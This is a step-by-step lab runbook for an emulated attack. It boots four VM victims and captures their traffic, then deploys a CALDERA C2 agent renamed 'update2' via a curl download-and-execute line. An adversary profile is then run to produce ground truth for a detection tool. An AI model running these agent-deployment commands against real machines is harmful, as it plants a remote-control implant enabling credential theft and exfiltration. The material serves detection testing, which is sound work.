# Run 2 — step by step (design operation, profile B)

Every command is labelled by where to run it: **[MAC]** = your Mac terminal in the lab folder,
**[web01]/[app01]/[ws-dev01]/[ws-fin01]** = that victim's console, **[KALI]** = Kali terminal,
**[CALDERA UI]** = the browser at http://192.168.64.8:8888.

Constants: Kali = `192.168.64.8`, CALDERA key = `ADMIN123`, profile = `B`, users =
web01→`www`, app01→`svc`, ws-dev01→`bob`, ws-fin01→`alice`.

Lab folder, for every [MAC] command:
```
cd "<repo root>/Test Setup/lab"
```

---

## Phase 1 — [MAC] revert to burned-in and boot

Make sure the four are powered off first (`pgrep -fl qemu-system-aarch64` shows nothing), then:
```
for v in web01 app01 ws-dev01 ws-fin01; do qemu-img snapshot -a burned-in "victims/$v/disk.qcow2"; done
```
Now boot each in its **own terminal tab**:
```
sudo ./run-victim.sh web01
```
```
sudo ./run-victim.sh app01
```
```
sudo ./run-victim.sh ws-dev01
```
```
sudo ./run-victim.sh ws-fin01
```
Log in at each prompt (user above, the lab password you set as `LAB_PASSWORD`).

## Phase 2 — read the IPs and fill them in

On **each** victim console:
```
ip a | grep 'inet 192'
```
Write them here and use them for the rest of Run 2:

| host | user | IP |
|---|---|---|
| web01 | www | `192.168.64.____` |
| app01 | svc | `192.168.64.____` |
| ws-dev01 | bob | `192.168.64.____` |
| ws-fin01 | alice | `192.168.64.____` |

**[MAC]** update `fleet.txt` to these four IPs:
```
open -e fleet.txt
```
(leave the `# KALI …` line commented.)

## Phase 3 — [each victim] re-point sensors to Kali and verify

On **each** victim console (the lab password you set as `LAB_PASSWORD`):
```
sudo ./fixup.sh 192.168.64.8
```
It should end with `rules: ~18` and `services: active active active`. Then confirm forwarding —
**[KALI]**:
```
sudo grep -r fixup-test /var/log/lab/
```
You should see a line from each hostname. If a host is missing, re-run its `fixup.sh`.

## Phase 4 — [MAC] start the capture
```
./capture.sh start run2
```
Expect `capturing on bridge100 (192.168.64.0/24) -> captured/run2/network/campaign.pcap`.

## Phase 5 — [each victim] start the benign persona (leave running the whole run)

Run the line for that host (PEERS = the *other* three IPs you filled in Phase 2). Each line is:
clear any old unit, then start.

**[web01]**
```
sudo systemctl stop benign 2>/dev/null; sudo systemctl reset-failed benign 2>/dev/null
sudo systemd-run --unit=benign --uid="$USER" --setenv=PEERS="<app01-ip> <ws-dev01-ip> <ws-fin01-ip>" --setenv=LAB_PASS=<lab-password> /home/$USER/benign.sh web 0
```
**[app01]**
```
sudo systemctl stop benign 2>/dev/null; sudo systemctl reset-failed benign 2>/dev/null
sudo systemd-run --unit=benign --uid="$USER" --setenv=PEERS="<web01-ip> <ws-dev01-ip> <ws-fin01-ip>" --setenv=LAB_PASS=<lab-password> /home/$USER/benign.sh app 0
```
**[ws-dev01]**
```
sudo systemctl stop benign 2>/dev/null; sudo systemctl reset-failed benign 2>/dev/null
sudo systemd-run --unit=benign --uid="$USER" --setenv=PEERS="<web01-ip> <app01-ip> <ws-fin01-ip>" --setenv=LAB_PASS=<lab-password> /home/$USER/benign.sh dev 0
```
**[ws-fin01]**
```
sudo systemctl stop benign 2>/dev/null; sudo systemctl reset-failed benign 2>/dev/null
sudo systemd-run --unit=benign --uid="$USER" --setenv=PEERS="<web01-ip> <app01-ip> <ws-dev01-ip>" --setenv=LAB_PASS=<lab-password> /home/$USER/benign.sh fin 0
```
Check one: `systemctl is-active benign` → `active`.

## Phase 6 — WAIT ~30 minutes (pre-attack benign windows)

Do nothing. Personas run; the capture records. Note the current UTC time as "benign start".

## Phase 7 — [MAC] build profile B in CALDERA
```
CALDERA_KEY='ADMIN123' python3 build_linux_profile.py --profile B --server http://192.168.64.8:8888 --manifest captured/run2/profile.json
```
It prints `created adversary 'ARGUS-Linux-B' id=…`. If it prints coverage gaps, that's fine (reported as untested).

## Phase 8 — [each victim] deploy the CALDERA agent (renamed for S15)

On **each** victim console — note the filename `update2` (a different name than run 1's):
```
server="http://192.168.64.8:8888"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "architecture:arm64" $server/file/download > update2
chmod +x update2
./update2 -server $server -group red -v &
```
Each prints `[+] Beacon (HTTP): ALIVE`. In **[CALDERA UI] → agents**, all four show up in group `red`.

## Phase 9 — [CALDERA UI] run the operation

1. **Operations → + (Create Operation)**.
2. Name: `run2`.
3. **Adversary:** `ARGUS-Linux-B`.
4. **Group:** `red`.
5. **Planner:** `atomic`. **Obfuscation:** `plain-text`.
6. **Start.** Watch the abilities turn green on each agent. Let it run to completion (status "finished").
7. Note the UTC start and finish times.

## Phase 10 — [MAC] write the run manifest

Create `captured/run2/manifest.json` (edit the times/IPs):
```
mkdir -p captured/run2
cat > captured/run2/manifest.json <<'EOF'
{ "run": "run2", "role": "design", "profile": "B",
  "victims": ["web01","app01","ws-dev01","ws-fin01"],
  "agent_file": "update2", "log_clearing": false, "clock_offset_host": null,
  "benign_start_utc": "FILL", "op_start_utc": "FILL", "op_finish_utc": "FILL" }
EOF
```

## Phase 11 — WAIT ~30 minutes (post-attack benign windows)

Leave personas running. Then note "benign end" UTC time.

## Phase 12 — [MAC] stop, collect

```
./capture.sh stop run2
./capture.sh pull run2
( cd captured/run2/network && zeek -C -r campaign.pcap )
```
**[CALDERA UI] → Operations → run2 → Download report** → save as
`captured/run2/attack_report.json` (if you download on Kali, scp it to the Mac path).

Then stop personas + power off:
- **[each victim]** `sudo systemctl stop benign` then `sudo poweroff`

## Phase 13 — [MAC] build the ARGUS ground truth (optional now, needed before scoring)
```
cd <repo root> && export PYTHONPATH="source code"
python tools/apt_capture/caldera_report.py "Test Setup/lab/captured/run2/attack_report.json" \
    --out "Test Setup/lab/captured/run2/ground_truth.json"
python -c "import json;d=json.load(open('Test Setup/lab/captured/run2/ground_truth.json'));print(len(d['actions']),'actions',len(d['techniques']),'techniques')"
```
A healthy run 2 shows **many** actions across discovery/credential-access/collection/exfiltration
(not the 4-action stall run 1 had).

---

## Checklist
- [ ] reverted to burned-in, booted, logged in
- [ ] IPs read, fleet.txt updated
- [ ] fixup run on all four; forwarding test line on Kali for each
- [ ] capture started
- [ ] personas started on all four (active)
- [ ] ~30 min benign
- [ ] profile B built (`ARGUS-Linux-B`)
- [ ] agent `update2` deployed on all four; 4 agents in CALDERA
- [ ] operation `run2` ran to "finished"
- [ ] manifest written with times
- [ ] ~30 min benign
- [ ] stop + pull + Zeek + report downloaded
- [ ] ground_truth.json shows many actions
